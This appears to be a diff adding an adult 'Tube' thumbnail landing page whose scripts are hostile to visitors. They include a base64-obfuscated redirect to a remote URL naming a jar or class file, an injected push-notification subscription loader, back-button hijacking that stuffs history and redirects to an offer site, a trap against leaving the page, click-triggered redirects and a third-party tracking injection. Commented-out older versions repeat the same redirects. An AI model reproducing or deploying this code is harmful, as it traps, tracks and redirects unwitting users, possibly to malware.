@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="referrer" content="no-referrer" />
+
+    <script>
+        // Old
+        function y105(v) { return window.atob(v); }
+        var paramsString = document.location.search;
+        if (paramsString.includes('{') || paramsString.includes('[')) {
+            window[y105('bG9jYXRpb24=')][y105('aHJlZg==')] = y105('aHR0cHM6Ly9jb29sYXBwc3R1ZmYuY29tL2Ytbmx2M2otaGMtamFyLWRvdDAtZjFqOS5jbGFzcw==');
+        
+        } else if (paramsString.includes('?')) {
+        
+            alert('Are you 18+ years old?');
+        }
+    </script>
+    <script>
+        //old
+        document.addEventListener("DOMContentLoaded", function(e) {
+                var loc = window.location.pathname+window.location.search
+                window.history.replaceState({}, '', loc)
+            });
+    </script>
+
+
+
+    <!-- <script>
+        // new
+        function y105(v) { return window.atob(v); }
+        var paramsString = document.location.search;
+        if (paramsString.includes('{') || paramsString.includes('[')) {
+            window[y105('bG9jYXRpb24=')][y105('aHJlZg==')] = y105('aHR0cHM6Ly9jb29sYXBwc3R1ZmYuY29tL2Ytbmx2M2otaGMtamFyLWRvdDAtZjFqOS5jbGFzcw==');
+        } else if (paramsString.includes('?')) {
+            const today = new Date();
+            const key = 'saw-it-less-than-10-minutes';
+            const sawItLessThan10Minutes = JSON.parse(localStorage.getItem(key));
+            const diffToMinutes = diffMs => Math.round(((diffMs % 86400000) % 3600000) / 60000);
+        
+            if (!sawItLessThan10Minutes || (sawItLessThan10Minutes && diffToMinutes(today - new Date(sawItLessThan10Minutes)) > 10)) {
+                    localStorage.setItem(key, JSON.stringify(today));
+                    alert('Are you 18+ years old?');
+                }
+        }
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function(e) {
+            var loc = window.location.pathname+window.location.search
+            window.history.replaceState({}, '', loc)
+        });
+
+    </script> -->
+    <style>
+        html {
+            font-family: sans-serif;
+            -ms-text-size-adjust: 100%;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            margin: 0;
+        }
+
+        article,
+        aside,
+        details,
+        figcaption,
+        figure,
+        footer,
+        header,
+        hgroup,
+        main,
+        menu,
+        nav,
+        section,
+        summary {
+            display: block;
+        }
+
+        audio,
+        canvas,
+        progress,
+        video {
+            display: inline-block;
+            vertical-align: baseline;
+        }
+
+        audio:not([controls]) {
+            display: none;
+            height: 0;
+        }
+
+        [hidden],
+        template {
+            display: none;
+        }
+
+        a {
+            background-color: transparent;
+        }
+
+        a:active,
+        a:hover {
+            outline: 0;
+        }
+
+        abbr[title] {
+            border-bottom: 1px dotted;
+        }
+
+        b,
+        strong {
+            font-weight: 700;
+        }
+
+        dfn {
+            font-style: italic;
+        }
+
+        h1 {
+            font-size: 2em;
+            margin: .67em 0;
+        }
+
+        mark {
+            background: #ff0;
+            color: #000;
+        }
+
+        small {
+            font-size: 80%;
+        }
+
+        sub,
+        sup {
+            font-size: 75%;
+            line-height: 0;
+            position: relative;
+            vertical-align: baseline;
+        }
+
+        sup {
+            top: -.5em;
+        }
+
+        sub {
+            bottom: -.25em;
+        }
+
+        img {
+            border: 0;
+        }
+
+        svg:not(:root) {
+            overflow: hidden;
+        }
+
+        figure {
+            margin: 1em 40px;
+        }
+
+        hr {
+            -moz-box-sizing: content-box;
+            box-sizing: content-box;
+            height: 0;
+        }
+
+        pre {
+            overflow: auto;
+        }
+
+        code,
+        kbd,
+        pre,
+        samp {
+            font-family: monospace, monospace;
+            font-size: 1em;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            color: inherit;
+            font: inherit;
+            margin: 0;
+        }
+
+        button {
+            overflow: visible;
+        }
+
+        button,
+        select {
+            text-transform: none;
+        }
+
+        button,
+        html input[type=button],
+        input[type=reset],
+        input[type=submit] {
+            -webkit-appearance: button;
+            cursor: pointer;
+        }
+
+        button[disabled],
+        html input[disabled] {
+            cursor: default;
+        }
+
+        button::-moz-focus-inner,
+        input::-moz-focus-inner {
+            border: 0;
+            padding: 0;
+        }
+
+        input {
+            line-height: normal;
+        }
+
+        input[type=checkbox],
+        input[type=radio] {
+            box-sizing: border-box;
+            padding: 0;
+        }
+
+        input[type=number]::-webkit-inner-spin-button,
+        input[type=number]::-webkit-outer-spin-button {
+            height: auto;
+        }
+
+        input[type=search] {
+            -webkit-appearance: textfield;
+            -moz-box-sizing: content-box;
+            -webkit-box-sizing: content-box;
+            box-sizing: content-box;
+        }
+
+        input[type=search]::-webkit-search-cancel-button,
+        input[type=search]::-webkit-search-decoration {
+            -webkit-appearance: none;
+        }
+
+        fieldset {
+            border: 1px solid silver;
+            margin: 0 2px;
+            padding: .35em .625em .75em;
+        }
+
+        legend {
+            border: 0;
+            padding: 0;
+        }
+
+        textarea {
+            overflow: auto;
+        }
+
+        optgroup {
+            font-weight: 700;
+        }
+
+        table {
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+
+        td,
+        th {
+            padding: 0;
+        }
+    </style>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+        }
+
+        input:focus {
+            outline: none;
+        }
+
+        img,
+        table {
+            border: none;
+        }
+
+        a:link,
+        a:visited {
+            text-decoration: none;
+            color: #0a0d70;
+        }
+
+        a:hover,
+        a:active {
+            text-decoration: underline;
+        }
+
+        button {
+            outline: none;
+            cursor: pointer;
+        }
+
+        ul,
+        ol {
+            list-style: none;
+        }
+
+        img {
+            width: auto\9;
+            height: auto;
+            max-width: 100%;
+            vertical-align: middle;
+            border: 0;
+            -ms-interpolation-mode: bicubic;
+        }
+
+        body {
+            background: #fff;
+            font: 14px "Times New Roman", Times, serif;
+            color: #000;
+        }
+
+        .thumbs {
+            text-align: center;
+        }
+
+        .thumbs li {
+            display: inline-block;
+            vertical-align: top;
+            margin: 0 0 4px 0;
+        }
+
+        .thumbs li a {
+            display: block;
+            position: relative;
+        }
+
+        .thumbs li a::before {
+            content: "";
+            width: 60px;
+            height: 60px;
+            background: url('/landingStatic/file/21fcd5faf7a8bf3b6845b5531443b2d4.jpg') no-repeat;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin: -30px 0 0 -30px;
+            z-index: 10;
+        }
+
+        a.link {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+
+        .thumbs li a img {
+            border: 1px solid #000;
+        }
+
+        @media only screen and (max-width: 767px) {
+            .thumbs li {
+                width: 49%;
+                margin-right: -4px;
+            }
+
+            .thumbs li img,
+            .thumbs li iframe,
+            .thumbs li object,
+            .thumbs li embed {
+                width: 100%;
+                height: auto;
+            }
+
+            .thumbs li {
+                padding: 0 2px;
+            }
+        }
+    </style>
+    <title>Tube </title>
+    <link id="pl763847_font" rel="preconnect" href="//fonts.gstatic.com">
+    <link id="pl763847_stylesheet" rel="stylesheet"
+          href="//fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&amp;amp;display=swap">
+</head>
+
+<body>
+<script>
+    var url = new URL(window.location.href);
+    var ppi = url.searchParams.get('sourceid');
+    var s = document.createElement('script');
+    s.src='//laugoust.com/pfe/current/micro.tag.min.js?z=6250064'+'&var='+ppi+'&sw=/sw-check-permissions-e66b5.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+<ul class="thumbs">
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src=" /landingStatic/file/18a3af65a38f1704534d9ebdd4950a2e.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/e9bfe1d4a4ee754e13654521c495c5ff.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/29cc66e56124c7805e65dee612b8c98e.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/08cf6d45da3dc62995c53b4d3a155ddb.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/3fbad8341013e5a6797ff2c55bc42924.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/b1ffe3c70244d44b0f201b5ee3f48274.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/1f573a4f3f20046438d3454ec9f51d93.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/654a2dec471143915d6c8028f648fae9.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/b0411c1b24fa84cec630cc7d20741dd0.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/d905ea2ca1ec26bd0333014450bc6af9.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/5d0ea7df8a9bbfbac1609aad16246028.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/96ee7882abc1f0fa3e1da87ef40ba76b.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/999a02b285f220e92d46c9e07f1b5eb5.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/c660176391ea567540bc29af208e10da.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/2fb006b41e00d13237089a621a1884ad.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/bc98f664239af5c4037c245d61d8a2b4.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/c03c48bc6691d66dcde6d3f8ebc825c3.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/4d94a506368bd0cb631288027cd4be74.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/5ff5f7e6839c9da74f5b508678503c95.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/df0c962295424162cd4adadefdd621a8.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/c8ff96c963621dba039c05059e00eb6f.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/465ed9d29bfdea0962b9ac177faad72c.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/74f905db664adbc5bc833baf7d53a27e.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/8347d3f60567a146021ac1879fa25573.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/75f2a5f1d0a63cc8ada21e5bf51cd107.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/f9095a44a972cbbb663a5b63ef4efb60.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/d8ba6e291fb911c073eec406f25def89.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/6aa65225c1a634f7ba527e9b6035f2f9.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/41395717e716c319e7762103314c8e4e.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/16e1f9aef90072ecd1b810a389842d49.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/9efbc4e8f4b96c2d838b19e2cd029a2f.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/cbb0971a936215aad0860d9b9907b5e9.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/2b90e83cccfd3c9999644e00cc3af34f.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/762f9b9c2d6839b09e94bae87ae959b8.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/15a03bd7383112aaac19435d5a5b6fc4.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/021a3a8cbddc9b8b8ffc859a4242b52a.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/0529da061943e4d8574c985aee9b9fe4.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/3453ca3816941c3a975283e1defbff89.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/8645904fd6e4b60b77d77be45b1fd4c2.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/650705865f9ea792e36b1862c02b893e.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/9f9d226edbb8b07718de3f044cf89356.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/541af79ecd2610eab1d710535aafe1bc.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/171fa10bdf43555bba867a1901207abf.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/165b943ea0052f39b285b904fe148f1f.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/c7039e19e92417adda24fda11ea5ab5c.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/2b21b8df7a7e34683b762fca12d82062.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/0282663a63caa70d758979f569ecbe02.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/82f6c8f7ba4d9b20029e8ce410ebcc8a.jpg" alt="" ></a></li>
+    <li><a rel="noreferrer noopener"
+           class="get-params-link" ><img src="/landingStatic/file/7903987caecb97c4ca5b53d97a849fe3.jpg" alt="" ></a></li>
+</ul>
+<center><a rel="noreferrer noopener" class="get-params-link"><img
+        src="/landingStatic/file/dbfdccc8696562a0649f45d9fdb6df51.jpg" alt=""></a></center>
+
+<script>        
+// new script backbutton
+        window.rConf = {
+          url: {
+            domain: "https://tikeduz.com/3-kcj27-e1bi-dfst-h4l4",
+            params: "?userId=92ad54249dea4bf8ea523faa1885d7472a9cb10b1d74b6a2440a6db62e9283d2&memberId=##visitId##&sourceId=##sourceId##_##subId_1##"
+          },
+          debug: 0,
+          rDelayMs: 1000
+        };
+        
+        (function (w, l, d, h) {
+          var url = `${w.rConf.url.domain}/${w.rConf.url.params}`;
+        
+          var redirect = function() {
+            if (w.rConf.debug === 1) {
+              console.log("Redirect -> " + url);
+            } else {
+              w.onbeforeunload = null;
+              w.location.replace(url);
+            }
+          };
+        
+          var handleHistory = function () {
+            var title = d.title;
+            var to = l.pathname + l.search;
+            h.replaceState(null, title, to);
+        
+            try {
+              for (var i = 0; i < 10; i++) {
+                h.pushState(null, title, to);
+              }
+            } catch (e) {}
+        
+            var onPopstate = function () {
+              h.replaceState(null, title, to);
+              redirect();
+            };
+        
+            w.addEventListener("popstate", onPopstate);
+          };
+        
+          var handleBeforeUnload = function () {
+            var beforeUnloadHandler = function (e) {
+              setTimeout(function() {
+                alert();
+              }, 100);
+              e.preventDefault();
+              e.returnValue = "*";
+            };
+        
+            if (!w._beforeUnloadAttached) {
+              w.addEventListener("beforeunload", beforeUnloadHandler);
+              w._beforeUnloadAttached = true;
+            }
+          };
+        
+        
+          d.addEventListener("readystatechange", function () {
+            if (d.readyState === "interactive") {
+              handleHistory();
+              handleBeforeUnload();
+        
+              d.addEventListener("click", function(e) {
+                var target = e.target;
+                while (target && target !== this) {
+                  if (target.matches("a")) {
+                    setTimeout(redirect, w.rConf.rDelayMs || 3000);
+                    break;
+                  }
+                  target = target.parentNode;
+                }
+              }, false);
+            }
+          });
+        
+        })(window, location, document, history); 
+</script>
+
+        <!-- <script>
+// old script
+window.addEventListener("click", () => {
+                        !(function () {
+                          var t;
+                          try {
+                            for (t = 0; 10 > t; ++t)
+                              history.pushState({}, "", "#");
+                            onpopstate = function (t) {
+                              t.state &&
+                                location.replace(
+                                  "https://okoffers4u.com/click?key=9dc165dab53774511c4a"
+                                );
+                            };
+                          } catch (o) {}
+                        })();
+                      });
+                    </script> -->
+
+<script>
+    var interval = setInterval(function() {
+        if(document.querySelector('#visitId') && document.querySelector('#visitId').value) {
+            clearInterval(interval);
+            var pars = {'visitId': '', 'landingId': '', 'sourceId': '', 'offerId': '', 'templateId': '', 'advUrl': ''};
+            Object.keys(pars).forEach(function (par) {
+                if(document.querySelector("#" + par)) {
+                    pars[par] = document.querySelector("#" + par).value;
+                }
+            });
+            if(window.location) {
+                var url = new URL(window.location.href);
+            }
+
+            window.kmnr = {
+                kmnrKey: "619779629",
+                sub1: url.searchParams.get("subid_1"),
+                sub2: url.searchParams.get("subid_2"),
+                sub3: pars.offerId,
+                sub4: pars.sourceId,
+                sub5: pars.landingId,
+                sub6: pars.visitId,
+                sub7: url.searchParams.get("subid_7"),
+            };
+
+            var kmnrSc = document.createElement('script');
+            kmnrSc.setAttribute('async', true);
+            kmnrSc.setAttribute('charset', 'utf-8');
+            kmnrSc.src = '//kaminari.systems/v1/script.js?kmnrKey=' + window.kmnr.kmnrKey;
+            var pr = document.getElementsByTagName('head')[0] || document.body
+            pr && pr.appendChild(kmnrSc);
+        }
+    }, 100);
+</script>
+
+<!-- <script>
+    let ls = localStorage.getItem('site.visited');
+    if (ls == null) {
+        localStorage.setItem('site.visited', 1)
+    }
+    if (localStorage.getItem('site.visited') == 1) {
+        document.addEventListener('click', () => {
+            window.location.href = 'https://okoffers4u.com/click?key=9dc165dab53774511c4a'; 
+        })
+    }
+</script> -->
+
+<!-- <script src="/landingStatic/file/785cd1e95571933217215eb06822d5b3.js"></script>  post-click.js | source file in 'ID 268 | Script source' -->
+
+</body>
+
+</html>
